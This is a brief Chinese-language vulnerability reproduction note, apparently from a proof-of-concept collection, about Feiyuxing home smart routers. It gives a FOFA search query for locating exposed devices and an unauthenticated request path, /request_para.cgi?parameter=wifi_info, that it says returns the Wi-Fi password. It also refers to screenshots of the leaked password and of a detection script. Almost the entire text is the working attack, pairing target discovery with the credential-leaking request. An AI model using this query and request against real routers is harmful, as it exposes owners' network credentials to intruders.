# 影响范围：
飞鱼星智能路由器
# FOFa dork：
title="飞鱼星家用智能路由"  
# 漏洞复现：
登录页面：
![image](images/login.png)
通过访问未授权接口可以获得wifi登陆密码。  
未授权接口：  
```
/request_para.cgi?parameter=wifi_info
```
![image](images/pass.png)  
使用脚本进行检测：  
![image](images/script.png)



